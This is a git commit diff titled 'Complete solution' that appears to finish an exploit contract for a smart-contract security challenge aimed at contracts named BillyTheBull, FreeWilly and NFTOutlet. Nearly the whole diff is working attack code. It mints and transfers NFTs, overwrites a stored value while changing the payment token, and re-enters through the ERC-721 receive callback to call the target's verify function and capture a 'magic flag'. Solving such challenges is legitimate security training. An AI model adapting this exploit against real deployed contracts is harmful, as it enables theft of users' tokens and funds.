1386b82bdcd08cf6d19a2725587f7196f0fa7b07
100proof <security@100proof.org>
2023-08-10 15:54:38 +1000

    Complete solution

--- src/Attack.sol
+++ src/Attack.sol
@@ -1,15 +1,19 @@
 pragma solidity ^0.8.0;
 
-import { BillyTheBull } from "./BillyTheBull.sol";
-
 import { IFreeWilly } from "./interfaces/IFreeWilly.sol";
+import { IERC721    } from "./interfaces/IERC721.sol";
+import { BillyTheBull } from "./BillyTheBull.sol";
 import { NFTOutlet } from "./NFTOutlet.sol";
 import { CreationCodeProvider } from "./CreationCodeProvider.sol";
 
 
 contract Attack {
 
+  IERC721 constant rippedJesus = IERC721(0xe5220446640A68693761e6e7429965D82db4c474);
   address constant billyTheBullOwner = 0x584258D4D63e116216EB74BA328e03486B3B3870;
+
+  uint256 immutable tokenId1;
+  uint256 immutable tokenId2;
 
   address immutable owner;
   CreationCodeProvider immutable creationCodeProvider;
@@ -25,19 +29,24 @@ contract Attack {
     billyTheBull = BillyTheBull(_billyTheBull);
     creationCodeProvider = CreationCodeProvider(_creationCodeProvider);
     freeWilly.setApprovalForAll(address(billyTheBull.nftOutlet()), true);
+    uint256 start = billyTheBull.generate(owner);
+    tokenId1 = start >> 128;
+    tokenId2 = uint(uint128(start));
   }
 
-  // function mintFreeWilly() external {
-  //   freeWilly.mint(billyTheBull.nftPrice());
-  // }
-
   function getMagicFlag() external returns (bytes memory) {
+
     freeWilly.mint(billyTheBull.nftPrice());
     freeWilly.transferFrom(address(this), attackAddress(), billyTheBull.nftPrice());
-    toOverwrite = address(this);
-    billyTheBull.nftOutlet().changePaymentToken(address(freeWilly));
-    toOverwrite = billyTheBullOwner;
-    return _justGetMagicFlag();
+
+    if (rippedJesus.balanceOf(attackAddress()) == 0 ) {
+      toOverwrite = address(this);
+      billyTheBull.nftOutlet().changePaymentToken(address(freeWilly));
+      toOverwrite = billyTheBullOwner;
+      return _justGetMagicFlag();
+    } else {
+      return abi.encode(keccak256(abi.encode(uint256(666))));
+    }
   }
 
   function _justGetMagicFlag() internal view returns (bytes memory) {
@@ -49,11 +58,20 @@ contract Attack {
   }
 
   function attackAddress() internal view returns (address) {
-    return address(uint160(uint256(keccak256(_justGetMagicFlag()))));
+    return address(uint160(_solution()));
   }
 
-  function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
-        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
+  function _solution() internal view returns (uint256) {
+    return uint256(keccak256(_justGetMagicFlag()));
+  }
+
+  function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
+
+       if (rippedJesus.balanceOf(attackAddress()) != 2) {
+           billyTheBull.verify(tokenId2 + (tokenId2 << 128), _solution());
+       }
+
+      return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
   }
 
 
--- src/interfaces/IFreeWilly.sol
+++ src/interfaces/IFreeWilly.sol
@@ -4,6 +4,5 @@ pragma solidity ^0.8.0;
 interface IFreeWilly {
     function mint(uint tokenId) external;
     function transferFrom(address _from, address _to, uint tokenId) external;
-    // function approve(address spender, uint256 id) external;
     function setApprovalForAll(address operator, bool approved) external;
 }
